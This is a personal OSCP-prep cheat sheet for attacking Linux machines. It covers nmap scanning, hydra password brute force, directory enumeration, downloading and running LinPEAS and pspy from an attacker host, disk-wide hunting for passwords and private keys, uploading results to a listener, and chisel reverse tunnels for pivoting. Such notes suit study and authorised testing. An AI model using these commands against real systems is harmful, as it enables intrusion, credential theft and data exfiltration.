---
title: "Fighting Linux Auto Win"
date: 2025-08-20 07:00:00 +0700
categories: [cybersecurity]
tags: ["Machine"]
disclaimer: "Cybersecurity notes on Arai Notes are ethical, educational, and defensive-focused. They are intended to improve safety, awareness, and responsible system administration."
render_with_liquid: false
notion_id: "3c31d4b3b91780f8a364de8260242570"
notion_hash: "ac95e1226999dc6a"
notion_edited: ""
---

# Linux Pentesting Notes

This page is about notes for red teaming or doing a machine. I put this cheatsheet together while prepping for the OSCP. Instead of scattering my notes across ten different files, I consolidated all my core tools, command syntax, and methodologies into one single reference page inside VS Code. It’s broken down into sections and  each section includes step-by-step checklists and essential commands so I don't miss basic vectors when the exam clock is running.

### Checklist when fighting with Linux

1. nmap
2. check every port and run hydra or nxc spray
    1. web ports → directory enum
    2. databases port → hydra spray
    3. FTP → login anonymous, try to extract any files
    4. Try to find some injection point vulnerabilities from CVE public exploits or web vuln
3. Try to find some injection point vulnerabilities, more information, credentials, etc
    1. if get password, crack it then spray and pray the password 
    2. if got shell do basic enumeration
4. Got a Shell → basic enumeration → linpeas → analyze linpest 
5. credential theft, uncommon files
6. Try to find PE
    1. another IP segment → lateral movement
    2. unaccessible web/ports → port forwarding
    3. another user try to escalate to that user
    4. cron job
    5. writable, SUID, etc

## 🔎 Nmap

- **Port scanning**

```bash
nmap -p- --max-retries 1 --max-scan-delay 20 -T4 -Pn -v --open -oN out.nmap --system-dns --stats-every 3s {ip_attack}
```

- **Service + Banner scan**

```bash
nmap -sCV -p$ports --open -oN v2out.nmap --system-dns --stats-every 2s {ip_attack}
```

- **UDP scan**

```bash
nmap -sU -sV -sC -n -F -T4 {ip_attack}
```

---

## 🔐 Brute Force / Spraying

- **SSH brute force**

```bash
hydra -l george -P /usr/share/wordlists/rockyou.txt -s 2222 ssh://{ip_attack}
```

- **HTTP form brute force**

```bash
hydra -l user -P /usr/share/wordlists/rockyou.txt {ip_attack} -s 80 http-post-form "/index.php:fm_usr=user&fm_pwd=^PASS^:Login failed. Invalid"
```

- **NetExec**

```bash
nxc ftp/ssh -u user -p pass {ip_attack}
```

---

## 🌐 Directory Listing

```bash
dirsearch -u http://{ip_attack}
feroxbuster -u http://{ip_attack} -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-words.txt
gobuster dir -u http://{ip_attack} -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-words.txt --wildcard
```

---

## 🐚 Better Shell

```bash
/usr/bin/python3 -c "import pty;pty.spawn('/bin/bash')"
python -c "import pty;pty.spawn('/bin/bash')"
python2 -c "import pty;pty.spawn('/bin/bash')"
```

---

## 🍃 LinPEAS

```bash
cd /tmp && curl -o linpeas.sh {ip_local}:81/linpeas.sh && chmod +x linpeas.sh
./linpeas.sh > peas.log
```

---

## 📋 Basic Enumeration

```bash
uname -a && cat /etc/issue && cat /etc/os-release
sudo -l
id
ps aux
ip a && routel
netstat -tulpn && ss -tulpn
dpkg -l
grep " install " /var/log/dpkg.log | awk '{print $4}' | cut -d: -f1
find / -writable -type d 2>/dev/null
find / -perm -u=s -type f 2>/dev/null
```

---

## 🔑 Credential Theft

- **Common patterns**
    - `password`, `passwd`, `pwd`, `secret`, `token`, `api_key`, `credential`, `key`, `PRIVATE KEY`
    - `DB`, `db_pass`, `dbpass`
- **Search**

```bash
grep -rinI "password" / 2>/dev/null
find / -type f -exec strings {} + 2>/dev/null | grep -i "password"
```

---

## ⏰ Cron Enumeration

```bash
crontab -u username -l
systemctl status cron && ls -la /etc/cron* && grep CRON /var/log/syslog && grep CRON /var/log/cron
cd /tmp && curl -o pspy64 {ip_local}:81/pspy64 && chmod +x pspy64 && ./pspy64
```

---

## 📂 Uncommon Files Discovery

- **List all files in /home**

```bash
cd /home && ls -la && find . -type d -exec sh -c 'echo; echo "{}:"; ls -la "{}"' \;
```

- **Search sensitive files**

```bash
find /home /var/www /srv -type f \( \
  -iname "*.kdbx" -o -iname "*.key" -o -iname "*.pem" -o -iname "*.pfx" -o -iname "*.p12" \
  -o -iname "id_rsa" -o -iname "id_dsa" -o -iname "id_ecdsa" -o -iname "id_ed25519" \
  -o -iname "*.sql" -o -iname "*.sqlite" -o -iname "*.db" -o -iname "*.bak" -o -iname "*.old" -o -iname "*.backup" \
  -o -iname "*.ini" -o -iname "*.cfg" -o -iname "*.conf" -o -iname "*.json" -o -iname "*.yaml" -o -iname "*.yml" -o -iname ".env" \
  -o -iname "*.log" -o -iname "*.pcap*" -o -iname "*.har" \
  -o -iname "*.doc" -o -iname "*.docx" -o -iname "*.xls" -o -iname "*.xlsx" -o -iname "*.pdf" -o -iname "*.txt" \
\) 2>/dev/null
```

- **Deeper search excluding /usr**

```bash
find / -path /usr -prune -o -type f \( \
  -iname "id_rsa" -o -iname "id_dsa" -o -iname "id_ecdsa" -o -iname "id_ed25519" \
  -o -iname "*.pem" -o -iname "*.kdbx" -o -iname ".env" -o -iname "*.sql" \
  -o -iname "*.pcap*" -o -iname "*.doc" -o -iname "*.docx" -o -iname "*.xls" -o -iname "*.xlsx" -o -iname "*.pdf" \
\) -print 2>/dev/null
```

---

## 🔄 File Transfer (Linux)

**Download**

```bash
curl -o file {ip_local}:81/file
wget {ip_local}:81/file -O file
```

**Upload**

```bash
curl -v --upload-file peas.log http://{ip}:82/peas.log
sftp user@{ip}
# then: put /path/to/file
```

**Alternative**

- Bash over TCP
- `nc`
- Base64 copy-paste

---

## 🔀 Port Forwarding

- **SSH**

```bash
ssh -fN -R 127.0.0.1:2345:127.0.0.1:8000 araisantai@{ip_local}
```

- **Chisel**

```bash
./chisel_1.10.1_linux_amd64 client {ip_local}:1234 R:2345:{ip_attack}:{port_attack}
```

---

## 🔗 Pivoting

**Single pivot**

```bash
chisel server --reverse -p 1234
./chisel client {ip_local}:1234 R:1080:socks
```

**Double pivot**

- **Config**

```text
/etc/proxychains4.conf >>
socks5 127.0.0.1 1080
socks5 127.0.0.1 1081
```

- **On host**

```bash
./chisel_linux server -p 9001 --reverse
```

- **On victim A**

```bash
./chisel_linux client {ip_local}:9001 R:1080:socks
./chisel_linux server -p 9002 --reverse
```

- **On victim B (other IP segment)**

```bash
./chisel_linux client {ip_attack_victimA}:9002 R:1081:socks
```
